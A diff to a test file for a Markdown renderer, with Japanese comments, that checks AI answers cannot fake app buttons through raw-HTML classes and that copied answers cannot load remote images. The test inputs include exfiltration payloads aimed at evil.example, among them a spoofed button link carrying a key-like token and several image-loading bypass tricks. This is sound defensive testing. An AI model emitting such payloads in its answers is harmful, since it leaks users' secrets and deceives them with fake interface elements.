@@ -87,11 +87,61 @@ describe('renderMarkdown（利用者の文書）', () => {
   })
 })
 
+describe('renderMarkdown remoteImages: false の class（AI の答え）', () => {
+  it('生の HTML の class を落とし、アプリのボタンに見えるリンクを作らせない。marked・KaTeX・このファイルが付ける class は残す（レビューの probe-b3）', () => {
+    const html = renderMarkdown(
+      '答えです。\n\n<div class="answer-view-actions"><button class="answer-view-keep">x</button><a class="answer-view-keep" href="https://evil.example/?d=sk-abc123">Canvasに残す</a></div>\n\n' +
+        '文の中の <a class="answer-view-keep" href="https://evil.example/?d=1" title="Canvasに残す">Canvasに残す</a> と $x^2$ と ![図](https://evil.example/p.png)\n\n```js\nconst a = 1\n```\n',
+      { remoteImages: false },
+    ).html
+    expect(html).not.toContain('answer-view')
+    const template = document.createElement('template')
+    template.innerHTML = html
+    const elements = [...template.content.querySelectorAll('[class]')]
+    const classes = elements.flatMap((element) => [...element.classList])
+    // KaTeX の中（KaTeX が付けた mord などの class）のほかは、自前の名前だけ
+    const outside = elements.filter((element) => !element.parentElement?.closest('.katex')).flatMap((element) => [...element.classList])
+    expect(outside.filter((name) => !/^(katex|md-|markdown-|language-)/.test(name))).toEqual([])
+    expect(classes).toContain('katex')
+    expect(classes).toContain('md-image-link')
+    expect(classes).toContain('language-js')
+  })
+
+  it('利用者の文書では、生の HTML の class を今のまま残す', () => {
+    expect(renderMarkdown('<div class="note">x</div>').html).toContain('class="note"')
+  })
+})
+
+// レビューの probe-b3 の、写しに残っていた形
+const COPY_INPUTS = [
+  '![a][r]\n\n[r]: https://evil.example/ref',
+  '![a [b]](https://evil.example/nested)',
+  '![a](https://evil.example/t "x) y")',
+  '<video poster="https://evil.example/v"></video>',
+  '<input type="image" src="https://evil.example/i">',
+  '<image src="https://evil.example/image">',
+  '![a](&#104;ttps://evil.example/e)',
+  '文の中の <img src="https://evil.example/inline"> です',
+  '<picture><source srcset="https://evil.example/s"></picture>',
+]
+
 describe('withoutRemoteImages（AI の答えを写すとき）', () => {
-  it('Markdown の画像と生の HTML の img を、説明と URL の文字にする', () => {
+  it('写したものを利用者の文書として描いても、外を読み込まない（参照形式・入れ子の角かっこ・題の中の )・文字参照の URL・生の HTML）', () => {
+    for (const input of COPY_INPUTS) {
+      const copied = withoutRemoteImages(input)
+      expect(loads(renderMarkdown(copied).html), `${input} → ${copied}`).toEqual([])
+      expect(copied, input).not.toMatch(/!\[|<(?:img|video|input|image|picture|source)\b/i)
+    }
+  })
+
+  it('Markdown の画像は説明と URL の文字に、生の HTML はタグの < > を全角にしてただの文字にする', () => {
     expect(withoutRemoteImages(`答え\n\n![グラフ](${SECRET})\n\n![](<${SECRET}> "題") と <img alt="図" src='${SECRET}'>`)).toBe(
-      `答え\n\n画像「グラフ」（${SECRET}）\n\n画像（${SECRET}） と 画像「図」（${SECRET}）`,
+      `答え\n\n画像「グラフ」（${SECRET}）\n\n画像（${SECRET}） と ＜img alt="図" src='${SECRET}'＞`,
     )
+    expect(withoutRemoteImages('![a][r]\n\n[r]: https://evil.example/ref')).toBe('画像「a」（https://evil.example/ref）\n\n[r]: https://evil.example/ref')
+    expect(withoutRemoteImages('![a [b]](https://evil.example/nested)')).toBe('画像「a [b]」（https://evil.example/nested）')
+    // コードの中は、そのまま
+    expect(withoutRemoteImages('`![a](https://x.example/p.png)` と\n\n```\n<img src="https://x.example/q">\n```')).toBe('`![a](https://x.example/p.png)` と\n\n```\n<img src="https://x.example/q">\n```')
     expect(withoutRemoteImages('![点](data:image/png;base64,AAAA)')).toBe('画像「点」')
     // リンクと、画像でない文は今のまま
     expect(withoutRemoteImages('[出典](https://example.org/a) と a ! [b](c)')).toBe('[出典](https://example.org/a) と a ! [b](c)')
